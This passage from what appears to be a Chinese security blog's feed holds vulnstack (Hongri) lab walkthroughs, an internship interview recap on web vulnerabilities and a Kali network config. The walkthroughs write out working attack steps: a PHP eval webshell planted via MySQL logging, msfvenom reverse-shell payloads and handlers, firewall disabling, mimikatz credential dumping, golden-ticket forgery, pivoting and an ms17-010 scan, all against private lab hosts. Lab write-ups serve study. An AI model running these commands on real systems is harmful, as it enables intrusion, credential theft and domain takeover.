<p><code>sudo rdesktop 192.168.0.80:3389 </code> 使用 <code>Mamor</code> <code>1qaz@WSX</code>成功登录</p>
<p><img src="/posts/8a9ea0cb/rdesktop.png"></p>
<p>(注：这里的360防护好像没有起作用，没有进行拦截)</p>
<h4 id="使用PSexec横向移动"><a href="#使用PSexec横向移动" class="headerlink" title="使用PSexec横向移动"></a>使用PSexec横向移动</h4><p>使用和上一个靶场一样的方法，创建一个smb监听器</p>
<p>在Targets中 选择主机右键jump-&gt; psexec，选择票据</p>
<p>然后得到如图，可以通过这种方法得到web机器的system权限</p>
<p><img src="/posts/8a9ea0cb/cs_graph_view.png"></p>
<p>成功拿到域控DC.</p>
<h4 id="CS派生MSF"><a href="#CS派生MSF" class="headerlink" title="CS派生MSF"></a>CS派生MSF</h4><p>在CS中创建一个 Foreign HTTP listener</p>
<p><img src="/posts/8a9ea0cb/cs_msf.png"></p>
<p>在msf中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt;  set payload windows/meterpreter/reverse_http</span><br><span class="line">set =&gt; payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost =&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8a9ea0cb/cs_msf_shell.png"></p>
<p>msf添加路由</p>
<p><img src="/posts/8a9ea0cb/msf_autoroute.png"></p>
<p><img src="/posts/8a9ea0cb/route_print.png"></p>
<p>配置代理，在proxychains4设置127.0.0.1 1080</p>
<p><img src="/posts/8a9ea0cb/socks_proxy.png"></p>
<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h5><p>在域控获取krbtgt账户的NTLM hash值和SID</p>
<p><img src="/posts/8a9ea0cb/dc_hashdump.png"></p>
<p><code>82dfc71b72a11ef37d663047bc2088fb</code></p>
<p><img src="/posts/8a9ea0cb/dc_logonpasswords.png"></p>
<p>SID <code>S-1-5-21-2756371121-2868759905-3853650604</code></p>
<h5 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h5><p>黄金票据时伪造票据授予票据(TGT)</p>
<p>利用需要的条件:</p>
<p>1.域名称</p>
<p>2.域的SID值</p>
<p>3.域的KRBTGT账户NTLM密码哈希</p>
<p>4.伪造用户名</p>
<p>使用CS清除client端(域内其他机器)的票据</p>
<p><code>kerberos_ticket_purge</code></p>
<p><code>shell klist</code>查看票据信息是否已经被清除</p>
<p><img src="/posts/8a9ea0cb/cs_shell_kilist.png"></p>
<p>使用CS生成黄金票据</p>
<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket.png"></p>
<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket2.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次长亭安全研究员实习生面试的经历</title>
    <url>/posts/e38ec14f/</url>
    <content><![CDATA[<p>前言:这个是在boss上hr昨天联系的我，然后今天下午通知我晚上进行面试…说的主要是研究比赛之类的，我说这个我不是很擅长，然后就尝试一下吧</p>
<hr>
<p>1.自我介绍</p>
<p>2.个人规划</p>
<p>3.近期参加的比赛，得过什么成绩吗</p>
<p>4.你认为什么是一道优秀的题目</p>
<p>回答的主要意思就是希望题目更贴近于实际环境</p>
<p>5.时间盲注用到的函数有哪些？如果sleep被禁用了还有什么函数可以替代</p>
<p>if sleep substr ，问sleep的替代函数时没想到，之前没接触过然后查了下是<code>benchmark</code></p>
<p>6.什么是二次注入</p>
<p>第一次注入后数据中存在脏数据，然后再次调用时没有对存在脏数据的数据进行检测，执行了数据库命令，从而使造成了数据库的注入</p>
<p>7.了解反序列化吗，说一下反序列化漏洞的原理</p>
<p>反序列化就是将字符数据转换为对象进行存储，然后再反序列化的</p>
<p>之前接触过shiro反序列化，fastjosn，weblogic</p>
<p>拿shiro反序列化举例子，shiro的RememberMe字段的值会先进行序列化，然后再进行AES加密，在进行base64加密。相对的，解密过程则是先对RememberMe的值进行base64解密，AES解密，反序列化。那么可以将构造恶意代码的语句放到Shiro的Cookie RememberMe中，被shiro服务器进行解析时，会进行反序列化，最后恶意代码会被执行从而造成反序列化漏洞。</p>
<p>8.说一下你印象较深的题目</p>
<p>我说了下之前4月份有接触过ssti，但是问我ssti的原理的时候就想不出来了…(在不正确使用模板引擎进行渲染时，会造成模板注入)</p>
<p>9.XSS分类，说一下弹xss的语句有哪些?</p>
<p>反射型，存储型，DOM型</p>
<p>然后我就说了可以用script JavaScript frame 之类的，然后师傅让我说下具体的写法，然后就简单说了下，师傅说这样写的话大多数是无法执行的</p>
<p>10.csrf和ssrf哪个危害更大一些？ssrf该如何防御</p>
<p>ssrf可以内容读取，探测内网；csrf可以盗取cookie，然后我说应该是csrf吧（虽然知道他们的作用，但是还是拿不定主意）然后师傅有问了下才确定是ssrf危害大。</p>
<p>然后问ssrf如何防御</p>
<p>11.泄漏类题目有接触过吗，接触过哪些</p>
<p>当时只想到了git泄漏，面试完突然想到了svn泄漏和DS_store泄漏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.hg源码泄漏</span><br><span class="line">.git源码泄露</span><br><span class="line">.DS_Store泄漏</span><br><span class="line">svn泄漏</span><br></pre></td></tr></table></figure>

<p>12.有什么问题要提问吗</p>
<p>当时只想到了刚才问的sleep函数的替代函数….别的都想不起来了，大脑一片空白…….</p>
<br>

<hr>
<p>感觉应该是凉凉了，面试挺突然的，没做啥准备，而且这个实习是比赛方面的，作为签到型选手几率更渺茫了…wuwuwu….先把红日靶场搞完，好好准备秋招了！</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>kali配置双网卡</title>
    <url>/posts/47c05aa1/</url>
    <content><![CDATA[<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo  vim /etc/network/interfaces</span><br><span class="line"> </span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.128</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.0.2</span><br><span class="line"></span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet static</span><br><span class="line">address 192.168.72.130</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">//保存后</span><br><span class="line">sudo service networking  restart     </span><br><span class="line">ifconfig</span><br><span class="line">reboot</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack1靶场</title>
    <url>/posts/bb76ba56/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali        VM2,NAT             192.168.72.130,192.168.0.128</span><br><span class="line">win7        VM2,VM1,NAT         192.168.52.143,192.168.72.129,192.168.0.178</span><br><span class="line">win2k3      VM1                 192.168.52.141</span><br><span class="line">winServer08 VM1                 192.168.52.138</span><br></pre></td></tr></table></figure>

<p>通用密码为 <code>hongrisec@2019</code> 更改后的密码为<code>hongrisec@2021</code></p>
<p>win7可以ping通所有主机，但所有主机都无法ping通win7(win7防火墙过滤了icmp,开启文件和打印机回显 imcpv4即可ping通)</p>
<p>win2003与win2008互通</p>
<p>(之前选择win7网络是选成了家庭网络导致无法在其他主机访问web服务，改为公用网络就i好了;使用VM1和Nat模式的win7域配置有点问题，然后就在后面内网渗透的时候重新设置了，给kali和win7配置了VM2网卡)</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap 192.168.0.178 -sS -Pn</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-13 20:31 CST</span><br><span class="line">Nmap scan report for 192.168.0.178</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:63:00:E0 (VMware)</span><br></pre></td></tr></table></figure>

<p>开放了80端口 和 3306端口</p>
<p>访问80端口，默认页面为phpstudy探针，得到网站绝对路径为<code>C:/phpStudy/WWW </code> 还有一个mysql数据库连接检测，输入root,root 显示成功连接数据库,可以确定得到数据库账号密码为 <code>root</code>  <code>root</code></p>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>sudo dirb http://192.168.0.178</code>  dirmap只扫描出了phpmyadmin</p>
<p><code>sudo python3 dirsearch.py -u http://192.168.0.178 -e */</code> dirsearch也只扫出来了phpmyadmin</p>
<p><code>sudo python3 dirmap.py  -i 192.168.0.178 -lcf</code> 使用dirmap 扫到了备份文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[200][application/x-rar-compressed][3.00mb] http://192.168.0.178/beifen.rar         </span><br><span class="line">[200][text/html][70.39kb] http://192.168.0.178/phpinfo.php                          </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpMyAdmin/            </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpMyadmin/            </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpmyadmin/            </span><br><span class="line">[200][text/html; charset=utf-8][4.28kb] http://192.168.0.178/phpmyAdmin/            </span><br><span class="line">[200][text/html; charset=utf-8][14.39kb] http://192.168.0.178//l.php  </span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="后台上传shell"><a href="#后台上传shell" class="headerlink" title="后台上传shell"></a>后台上传shell</h4><p>下载备份文件，发现为yxcms</p>
<p>访问 <code>192.168.0.178/yxcms</code>,主页中有敏感信息泄漏</p>
<p><img src="/posts/bb76ba56/info.png"></p>
<p>得到后台地址和登录账号</p>
<p>在前台模板处，可以新增php文件,创建一个shell1.php</p>
<p><img src="/posts/bb76ba56/shell1php.png"></p>
<p>通过之前下载的备份文件找一下shell1.php的文件路径</p>
<p><img src="/posts/bb76ba56/sehll1dir.png"></p>
<p>找到shell的文件路径为<code>yxcms/protected/apps/default/view/default/</code></p>
<p>访问<code>http://192.168.0.178/yxcms/protected/apps/default/view/default/shell1.php?cmd=phpinfo();</code>成功上传shell</p>
<p><img src="/posts/bb76ba56/shell_phpinfo.png"></p>
<p>使用蚁剑连接shell</p>
<p><img src="/posts/bb76ba56/ant_shell.png"></p>
<h4 id="phpmyadmin利用日志Getshell"><a href="#phpmyadmin利用日志Getshell" class="headerlink" title="phpmyadmin利用日志Getshell"></a>phpmyadmin利用日志Getshell</h4><p>弱口令<code>root</code>  <code>root</code>成功登录</p>
<p>查看是否有写入权限 <code>show variables like &#39;%secure_file%&#39;;</code></p>
<p>secure_file_priv 值为 NULL，不能使用 into outfile 方式写入 shell</p>
<p><img src="/posts/bb76ba56/phpmy1.png"></p>
<p>手动开启日志记录</p>
<p><img src="/posts/bb76ba56/phpmy2.png"></p>
<p>查看当前日志目录</p>
<p><img src="/posts/bb76ba56/phpmy3.png"></p>
<p>指定日志文件</p>
<p><code>set global general_log_file = &quot;C:/phpStudy/www/1.php&quot;;</code></p>
<p>再次查看日志目录</p>
<p><code>show variables like &#39;general%&#39;;</code></p>
<p><img src="/posts/bb76ba56/phpmy4.PNG"></p>
<p>将一句话木马写入指定的1.php</p>
<p><code>SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;</code></p>
<p><img src="/posts/bb76ba56/phpmy5.PNG"></p>
<p><img src="/posts/bb76ba56/phpmy6.PNG"></p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h4><p>打开msf进行本机监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.72.130</span><br><span class="line">set lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>使用msfvenom生成shell.exe</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.72.130 lport=9999 -f exe -o shell.exe</code></p>
<p>然后使用蚁剑上传shell.exe后执行</p>
<p>成功在msf上收到反弹shell</p>
<p><img src="/posts/bb76ba56/msf_shell.png"></p>
<p><code>getuid</code>查看当前权限</p>
<p>使用<code>getsystem</code>成功提权</p>
<p><img src="/posts/bb76ba56/msf_getsystem.png"></p>
<p>使用<code>sysinfo</code>查看系统信息</p>
<p><img src="/posts/bb76ba56/msf_sysinfo.png"></p>
<p>使用<code>ps</code>查看系统进程,找一个x64的进程，用户为<code>NT AUTHORITY\SYSTEM</code>,这样迁移后meterpreter的权限是迁移到的进程的权限，在此次选择使用id为400的进程进行迁移</p>
<p><img src="/posts/bb76ba56/msf_ps.png"></p>
<p><img src="/posts/bb76ba56/msf_migrate400.png"></p>
<p>使用<code>getpid</code> 查看当前Meterpreter Shell的进程PID</p>
<p>加载mimikatz模块<code>load mimikatz</code></p>
<p><img src="/posts/bb76ba56/msf_loadmimikatz_error.png"></p>
<p>根据提示，mimikatz模块已经被kiwi所取代</p>
<p>使用<code>help kiwi</code>可以查看帮助</p>
<p>在使用wiki的时候需要先迁移进程不然会无法正常运行</p>
<p><img src="/posts/bb76ba56/msf_kiwi_nomigrate.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help kiwi</span><br><span class="line"></span><br><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用<code>creds_all</code> 命令直接获取密码</p>
<p><img src="/posts/bb76ba56/msf_kiwi_creds_all.png"></p>
<p>使用<code>kiwi_cmd</code>后面接mimikatz.exe的命令</p>
<p><code>kiwi_cmd sekurlsa::logonpasswords</code>可以得到密码<code>hongrisec@2021</code></p>
<p><img src="/posts/bb76ba56/msf_kiwi_cmd.png"></p>
<p>进入shell <code>netstat -ano | findstr &quot;3389&quot;</code>查看3389端口是否开放，shell突然没了相应…然后发现靶机ip自动变了..</p>
<p>使用msf开启3389端口</p>
<p>meterpreter &gt;<code> run post/windows/manage/enable_rdp</code></p>
<p><img src="/posts/bb76ba56/msf_run_rdp.png"></p>
<p>(注：运行完该命令后突然发现连接不上shell了，去靶机看了下 网卡开启的自动获取ip，打开3389之后不知道为什么就自己换了ip，然后就在靶机上设置了固定ip 为 <code>192.168.72.136</code>)</p>
<p>然后再kali上尝试远程连接靶机</p>
<p><code>sudo rdesktop 192.168.72.136</code> 输入yes</p>
<p>使用<code>God\Administrator </code> <code>hongrisec@2021</code>成功登录</p>
<p><img src="/posts/bb76ba56/msf_rdesktop.png"></p>
<hr>
<h4 id="使用CS连接"><a href="#使用CS连接" class="headerlink" title="使用CS连接"></a>使用CS连接</h4><p>在CS中创建beacon http监听，</p>
<p>然后选择攻击-&gt;生产后门-&gt;Windows Executable(s),选择刚才创建的Listener生成1.exe</p>
<br>

<p>在蚁剑中关闭防火墙</p>
<p><code>netsh advfirewall set allprofiles state off</code></p>
<p>将生成的exe在蚁剑终端运行</p>
<p>在Cobalt Strike中它的心跳默认是60s(即sleep时间为60s，每一分钟目标主机与teamserver通信一次), 这会让执行命令或进行其他操作响应很慢</p>
<p><code>sleep 5</code> 设置时间为5s，如果设置值过小，流量会很明显 。</p>
<h5 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h5><p><code>shell whoami</code></p>
<p><code>shell net user</code></p>
<p><img src="/posts/bb76ba56/wininfo1.png"></p>
<p><code>shell net user /domain</code></p>
<p><img src="/posts/bb76ba56/shell_net_user_domain.png"></p>
<p><code>shell ipconfig /all</code></p>
<p><img src="/posts/bb76ba56/wininfo2.PNG"></p>
<p><img src="/posts/bb76ba56/wininfo3.PNG"></p>
<p><code>shell systeminfo </code></p>
<p><img src="/posts/bb76ba56/cs_shellsysteminfo.png"></p>
<p><img src="/posts/bb76ba56/cs_shellsysteminfo2.PNG"></p>
<p><code>shell net view</code></p>
<blockquote>
<p>net view 命令出现6118错误解决方法:关闭防火墙</p>
<p>netsh advfirewall set allprofiles state off</p>
</blockquote>
<p><img src="/posts/bb76ba56/cs_shellnetview.png"></p>
<p>查看主域信息 <code>shell net view /domain</code></p>
<p><img src="/posts/bb76ba56/cs_netview_domain.png"></p>
<p>查看时间 <code>net time /domain</code></p>
<p><img src="/posts/bb76ba56/net_view_time_domain.png"></p>
<p>查询当前的登录域与用户信息<code>net config workstation</code></p>
<p><img src="/posts/bb76ba56/net_config_workstation.png"></p>
<p>执行CS中的<code>net view</code></p>
<p><img src="/posts/bb76ba56/cs_netview.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域: god.org</span><br><span class="line">域内主机: OWA   192.168.52.138</span><br><span class="line">          ROOT-TVI862UBEH   192.168.52.141</span><br><span class="line">          STU1(win7)  192.168.52.143</span><br><span class="line">域内用户: Administrator</span><br><span class="line">          ligang</span><br><span class="line">          liukaifeng01</span><br><span class="line">域控: OWA 192.168.52.138</span><br></pre></td></tr></table></figure>

<h5 id="系统密码收集"><a href="#系统密码收集" class="headerlink" title="系统密码收集"></a>系统密码收集</h5><p>在CS中使用<code>hashdump</code>   <code>logonpasswords</code>  读取内存和密码</p>
<p><img src="/posts/bb76ba56/password1.png"></p>
<p>得到hash值和明文密码，密码为 <code>hongrisec@2021</code></p>
<p>也可以使用CS中的<code>Run mimikatz</code></p>
<p><img src="/posts/bb76ba56/run_mimikatz.png"></p>
<p>抓到的结果可以在<code>View -&gt;  Credentials</code>中查看</p>
<p><img src="/posts/bb76ba56/Credentials.png"></p>
<br>

<h5 id="横向探测"><a href="#横向探测" class="headerlink" title="横向探测"></a>横向探测</h5><p>使用CS中的<code>net view</code>和<code>port scan</code> 功能</p>
<p><img src="/posts/bb76ba56/cs_netview.png"></p>
<p><img src="/posts/bb76ba56/cs_portscan.png"></p>
<p>扫描出来的内容可以在target中看到</p>
<p><img src="/posts/bb76ba56/cs_target.png"></p>
<h6 id="使用CS的psexec"><a href="#使用CS的psexec" class="headerlink" title="使用CS的psexec"></a>使用CS的psexec</h6><p>1.先创建一个smb beacon</p>
<p><img src="/posts/bb76ba56/cs_new_smbbeacon.png"></p>
<p>2.在已有的Beacon上右键选择Spawnm，选择smb beacon的listener</p>
<p><img src="/posts/bb76ba56/cs_smb.png"></p>
<p>然后后生成派生的smb beacon</p>
<p><img src="/posts/bb76ba56/cs_psexec1.png"></p>
<p><img src="/posts/bb76ba56/cs_psexec2.PNG"></p>
<p>3.使用凭证连接其他内网机器</p>
<p>在Targets中 选择主机右键<code>jump</code>-&gt; <code>psexec</code></p>
<p><img src="/posts/bb76ba56/cs_psexec3.PNG"></p>
<p><img src="/posts/bb76ba56/cs_psexec4.PNG"></p>
<p>成功用此方法连接到OWA的beacon</p>
<p>但是在连接 ROOT-TVI862UBEH时，会报错，具体原因还没找到….求解决</p>
<p><img src="/posts/bb76ba56/cs_psexec_error.png"></p>
<p>4.当然也可以通过窃取GOD\Administrator的token来登录其他主机</p>
<p>选择beacon右键-&gt;Explore-&gt;Process List-&gt;找到GOD\Administrator的进程 点击右下角的<code>steal token</code></p>
<p>然后进入targets-&gt;jump-&gt;psexec-&gt;勾选左下方的勾 使用当前会话的token，这种方法和前面的效果相同</p>
<br>

<h5 id="CS派生msf会话"><a href="#CS派生msf会话" class="headerlink" title="CS派生msf会话"></a>CS派生msf会话</h5><p>在CS中创建一给Foreign HTTP(s)</p>
<p><img src="/posts/bb76ba56/cs_msf1.png"> </p>
<p>在msf中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set set payload windows/meterpreter/reverse_http</span><br><span class="line">set =&gt; payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.72.130</span><br><span class="line">lhost =&gt; 192.168.72.130</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 2222</span><br><span class="line">lport =&gt; 2222</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/bb76ba56/cs_msf2.png"></p>
<br>

<p>使用<code>run autoroute -s 192.168.72.0/24</code>报错 应该是在msf6中移除了</p>
<p><code>use post/multi/manage/autoroute</code> 选择autoroute模块添加路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 post(multi/manage/autoroute) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;/24&quot;</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; set session 10</span><br><span class="line">session =&gt; 10</span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/autoroute):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CMD      autoadd          yes       Specify the autoroute command (Accepted: add</span><br><span class="line">                                       , autoadd, print, delete, default)</span><br><span class="line">   NETMASK  255.255.255.0    no        Netmask (IPv4 as &quot;255.255.255.0&quot; or CIDR as</span><br><span class="line">                                       &quot;/24&quot;</span><br><span class="line">   SESSION  10               yes       The session to run this module on.</span><br><span class="line">   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; set subnet 192.168.52.0/24</span><br><span class="line">subnet =&gt; 192.168.52.0/24</span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; run</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line"></span><br><span class="line">[+] Route added to subnet 169.254.0.0/255.255.0.0 from host&#x27;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.52.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">[+] Route added to subnet 192.168.72.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line"></span><br><span class="line">msf6 post(multi/manage/autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   169.254.0.0        255.255.0.0        Session 10</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 10</span><br><span class="line">   192.168.72.0       255.255.255.0      Session 10</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>设置代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 post(multi/manage/autoroute) &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks_proxy):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password for SOCKS5 listener</span><br><span class="line">   SRVHOST   0.0.0.0          yes       The address to listen on</span><br><span class="line">   SRVPORT   1080             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username for SOCKS5 listener</span><br><span class="line">   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy  Run a SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; set version 5</span><br><span class="line">version =&gt; 5</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; </span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">Interrupt: use the &#x27;exit&#x27; command to quit</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 1.</span><br><span class="line"></span><br><span class="line">[*] Starting the SOCKS proxy server</span><br><span class="line">[*] Stopping the SOCKS proxy server</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>配置proxychains4</p>
<p><code>sudo vim /etc/proxychains4.conf</code></p>
<p>添加 <code>socks5 127.0.0.1 1080</code></p>
<p>测试是否可以去访问内网</p>
<p><code>proxychains4 curl http://192.168.52.143/</code> 成功访问到</p>
<p><img src="/posts/bb76ba56/proxy.png"></p>
<p>使用代理访问内网中192.168.52.141的机器</p>
<p><code>proxychains4 nmap -Pn -sT 192.168.52.141</code>nmap扫描一下端口，扫了很长时间……</p>
<p><img src="/posts/bb76ba56/nmap_output.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.52.141</span><br><span class="line">Host is up (1.5s latency).</span><br><span class="line">Not shown: 987 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">777/tcp  open  multiling-http</span><br><span class="line">1025/tcp open  NFS-or-IIS</span><br><span class="line">1028/tcp open  unknown</span><br><span class="line">1029/tcp open  ms-lsa</span><br><span class="line">1030/tcp open  iad1</span><br><span class="line">6002/tcp open  X11:2</span><br><span class="line">7001/tcp open  afs3-callback</span><br><span class="line">7002/tcp open  afs3-prserver</span><br><span class="line">8099/tcp open  unknown</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以使用msf中的<code>auxiliary/scanner/portscan/tcp</code>跑一下开放端口</p>
<p><img src="/posts/bb76ba56/msf_portscan_tcp.png"></p>
<p>先利用smb扫描系统版本 <code>auxiliary/scanner/smb/smb_version</code></p>
<p><img src="/posts/bb76ba56/msf_smb.png"></p>
<p><img src="/posts/bb76ba56/msf_smb2.png"></p>
<p><img src="/posts/bb76ba56/msf_smb3.png"></p>
<p>使用msf扫描模块检测是否存在ms17-010漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use /scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting        Required  Description</span><br><span class="line">   ----         ---------------        --------  -----------</span><br><span class="line">   CHECK_ARCH   true                   no        Check for architecture on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   CHECK_DOPU   true                   no        Check for DOUBLEPULSAR on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   